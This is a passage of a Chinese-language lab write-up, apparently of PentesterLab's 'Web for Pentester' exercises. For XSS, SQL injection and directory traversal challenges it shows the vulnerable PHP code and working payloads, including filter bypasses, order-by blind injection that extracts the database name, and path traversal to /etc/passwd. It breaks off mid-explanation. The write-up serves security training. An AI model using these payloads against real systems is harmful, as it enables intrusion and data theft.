<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example4.php?name=<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Example-5-编码或者其他方法绕过"><a href="#Example-5-编码或者其他方法绕过" class="headerlink" title="Example 5 编码或者其他方法绕过"></a>Example 5 编码或者其他方法绕过</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;../header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/alert/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Hello <span class="meta">&lt;?php</span>  <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload1</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example5.php?name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">confirm(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">example5.php?name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">prompt(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Example-6-闭合双引号"><a href="#Example-6-闭合双引号" class="headerlink" title="Example 6 闭合双引号"></a>Example 6 闭合双引号</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$a</span>= <span class="string">&quot;&lt;?php  echo <span class="subst">$_GET</span>[&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>通过 GET 方式传入的 name 变量，直接输出在了<code>script</code>标签里面，可以尝试闭合前面的双引号<code>&quot;</code>，然后直接调用<code>alert</code>方法来弹窗，末尾再使用双引号<code>&quot;</code>闭合后面的双引号。</p>
<p><strong>payload1</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">example6.php?name=<span class="string">&quot;;alert(&#x27;XSS&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $a=<span class="string">&quot;&lt;?php  echo &quot;</span>;</span><br><span class="line">alert(<span class="string">&#x27;XSS&#x27;</span>);</span><br><span class="line"><span class="string">&quot;; ?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Example-7-闭合单引号"><a href="#Example-7-闭合单引号" class="headerlink" title="Example 7 闭合单引号"></a>Example 7 闭合单引号</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$a</span>= <span class="string">&#x27;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&#x27;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>htmlentities()</code> 函数把字符转换为 HTML 实体</p>
<p>htmlentities()<code>会将双引号</code>“<code> 特殊编码，但是却它不编码单引号</code>‘</p>
<p><strong>payload</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">example7.php?name=<span class="string">&#x27;;alert(&#x27;</span>XSS<span class="string">&#x27;);&#x27;</span></span><br><span class="line">example7.php?name=<span class="string">&#x27;;alert(&#x27;</span>XSS<span class="string">&#x27;);//</span></span><br></pre></td></tr></table></figure>

<h2 id="Example-8-PHP-SELF"><a href="#Example-8-PHP-SELF" class="headerlink" title="Example 8 PHP_SELF"></a>Example 8 PHP_SELF</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span> <span class="string">&#x27;../header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;HELLO &quot;</span>.htmlentities(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">Your name:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>name 变量通过 form 表单以POST方式传入，然后通过<code>htmlentities</code>函数是实体化后输出来，这次通过 POST方式传入的 name 变量是比较安全的，暂时无法突破。</p>
<p>重点分析这里<code>&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot; method=&quot;POST&quot;&gt; </code>（php文件相对于网站根目录的位置地址），用户依然可以控制参数 <strong>PHP_SELF</strong>，并且这里没有过滤直接输入到了<code>form</code>标签中，所以这里通过闭合依然可以XSS。</p>
<p>闭合引号和标签，通过<code>&lt;script&gt;</code>标签来弹窗：</p>
<p><strong>payload1</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example8.php/<span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;//</span></span><br><span class="line"><span class="string">example8.php/&quot;</span> onclick=alert(<span class="string">&#x27;XSS&#x27;</span>)<span class="comment">//</span></span><br><span class="line">&lt;form action=<span class="string">&quot;/xss/example8.php/&quot;</span> onclick=alert(<span class="string">&#x27;XSS&#x27;</span>)<span class="comment">//&quot; method=&quot;POST&quot;&gt; 网页源码显示</span></span><br></pre></td></tr></table></figure>

<h2 id="Example-9-location-hash"><a href="#Example-9-location-hash" class="headerlink" title="Example 9 location.hash"></a>Example 9 location.hash</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  document.write(location.hash.substring(<span class="number">1</span>));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>直接通过<code>location.hash</code>传入参数，然后往网页中写入，这样很不安全，可以直接通过这个属性往网页中写入 JS 代码。要了解这个<code>location.hash</code>属性</p>
<p><strong>payload</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example9.php#&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>执行完成后，手动刷新下浏览器，经测试在 Chrome 和 FireFox 浏览器上的尖括号会被自动转码，在<code>IE</code>内核的浏览器上可以正常运行</p>
</blockquote>
<h1 id="SQL-injections"><a href="#SQL-injections" class="headerlink" title="SQL injections"></a>SQL injections</h1><h2 id="Example-1-基础注入"><a href="#Example-1-基础注入" class="headerlink" title="Example 1 基础注入"></a>Example 1 基础注入</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users where name=&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="variable">$row</span> = mysql_fetch_assoc(<span class="variable">$result</span>))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;age&#x27;</span>].<span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/sqli/example1.php?name=root&#x27; or 1=1;%23</span><br></pre></td></tr></table></figure>

<h2 id="Example-2-过滤空格"><a href="#Example-2-过滤空格" class="headerlink" title="Example 2 过滤空格"></a>Example 2 过滤空格</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/ /&#x27;, $_GET[&quot;name&quot;])) &#123;</span><br><span class="line">                die(&quot;ERROR NO SPACE&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">$sql = &quot;SELECT * FROM users where name=&#x27;&quot;;</span><br><span class="line">$sql .= $_GET[&quot;name&quot;].&quot;&#x27;&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>过滤空格可以尝试通过下面的字符来替代：</p>
<ul>
<li>%09 TAB 键（水平）</li>
<li>%0a 新建一行</li>
<li>%0c 新的一页</li>
<li>%0d return 功能</li>
<li>%0b TAB 键（垂直）</li>
<li>%a0 空格</li>
<li>/**/ 多行注释</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://192.168.189.128/sqli/example1.php?name=root&#x27;/**/or/**/1=1;%23</span><br></pre></td></tr></table></figure>

<h2 id="Example-3-过滤连续空格"><a href="#Example-3-过滤连续空格" class="headerlink" title="Example 3 过滤连续空格"></a>Example 3 过滤连续空格</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\s+/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;ERROR NO SPACE&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users where name=&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://192.168.189.128/sqli/example1.php?name=root&#x27;/**/or/**/1=1;%23</span><br></pre></td></tr></table></figure>

<h2 id="Example-4-画蛇添足的过滤"><a href="#Example-4-画蛇添足的过滤" class="headerlink" title="Example 4 画蛇添足的过滤"></a>Example 4 画蛇添足的过滤</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 直接拼接到 SQL 语句中</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>.=mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]).<span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符：<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，那么问题来了 这一题中并没有使用引号来闭合，所以注入的时候我们也不需要引号，所以实际上这个函数并没有发挥作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://192.168.189.128/sqli/example4.php?id=3 or 1=1</span><br></pre></td></tr></table></figure>

<h2 id="Example-5-画蛇添足的正则"><a href="#Example-5-画蛇添足的正则" class="headerlink" title="Example 5 画蛇添足的正则"></a>Example 5 画蛇添足的正则</h2><p><strong>关键代码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^[0-9]+/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;ERROR INTEGER REQUIRED&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users where id=&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>参数 id 必须是数字开头，否则直接终止函数运行。不过实际手工注入的时候默认 id 是满足这个条件的，除非我们手动修改这个 id 的值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://192.168.189.128/sqli/example5.php?id=3 or 1=1</span><br></pre></td></tr></table></figure>

<h2 id="Example-6-画蛇添足的正则-again"><a href="#Example-6-画蛇添足的正则-again" class="headerlink" title="Example 6 画蛇添足的正则 again"></a>Example 6 画蛇添足的正则 again</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[0-9]+$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR INTEGER REQUIRED&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users where id=&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>确保 id 的值以数字结束</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://192.168.189.128/sqli/example6.php?id=3 or 1=1</span><br></pre></td></tr></table></figure>

<h2 id="Example-7-m-正则缺陷-Bypass"><a href="#Example-7-m-正则缺陷-Bypass" class="headerlink" title="Example 7 /m 正则缺陷 Bypass"></a>Example 7 /m 正则缺陷 Bypass</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^-?[0-9]+$/m&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR INTEGER REQUIRED&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users where id=&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>开头到结尾都是数字，/m表示多行比配</p>
<ul>
<li>%0a来绕过/m模式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/sqli/example7.php?id=2%0aor 1=1</span><br></pre></td></tr></table></figure>

<h2 id="Example-8-order-by-盲注"><a href="#Example-8-order-by-盲注" class="headerlink" title="Example 8 order by 盲注"></a>Example 8 order by 盲注</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY `&quot;</span>;                         </span><br><span class="line"><span class="variable">$sql</span> .= mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&quot;order&quot;</span>]).<span class="string">&quot;`&quot;</span>;            </span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);       </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 数据库第 1 位的 ascii 码为 101 即 e</span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line"># 数据库第 2 位的 ascii 码为 120 即 x</span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line"></span><br><span class="line">example8.php?order=name` RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END))--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="Example-9-order-by-盲注"><a href="#Example-9-order-by-盲注" class="headerlink" title="Example 9 order by 盲注"></a>Example 9 order by 盲注</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&quot;order&quot;</span>]);</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 数据库第 1 位的 ascii 码为 101 即 e</span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;100) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;101) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line"># 数据库第 2 位的 ascii 码为 120 即 x</span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;119) THEN 0x6e616d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">example9.php?order=name RLIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),2,1))&gt;120) THEN 0x6e616d65 ELSE 0x28 END))</span><br></pre></td></tr></table></figure>



<h1 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h1><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$path</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p>默认头像的地址是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dirtrav/example1.php?file=hacker.png</span><br></pre></td></tr></table></figure></li>
<li><p>这里 path 变量没有进行任何过滤，导致可以通过<code>../../../</code>的形式造成目录穿越，下面直接丢 payload 吧:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dirtrav/example1.php?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])))</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(strstr(<span class="variable">$file</span>,<span class="string">&quot;/var/www/files/&quot;</span>)))</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$file</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>默认头像地址是：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dirtrav/example2.php?file=/var/www/files/hacker.png</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>这里检测了 file 参数必须含有 <code>/var/www/files/</code>，实际上并不影响我们使用 <code>../../</code>进行目录穿越：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dirtrav/example2.php?file=/var/www/files/../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="Example-3-00-截断"><a href="#Example-3-00-截断" class="headerlink" title="Example 3 %00 截断"></a>Example 3 %00 截断</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$UploadDir</span> = <span class="string">&#x27;/var/www/files/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])))</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$UploadDir</span> . <span class="variable">$file</span>.<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="comment">// Simulate null-byte issue that used to be in filesystem related functions in PHP</span></span><br><span class="line"><span class="variable">$path</span> = preg_replace(<span class="string">&#x27;/\x00.*/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_file(<span class="variable">$path</span>))</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$path</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>这里在我们的文件后面手动添加了 .png 后缀，导致我们不能随心所欲的读取文件了：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = <span class="variable">$UploadDir</span> . <span class="variable">$file</span>.<span class="string">&quot;.png&quot;</span>;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>实际上这里可以通过 00 截断来 Bypass PHP &lt;= 5.3.4 版本，且魔术引号处于关闭状态的时候可以 00 截断成功。但是这里表面上有过滤措施了：</p>
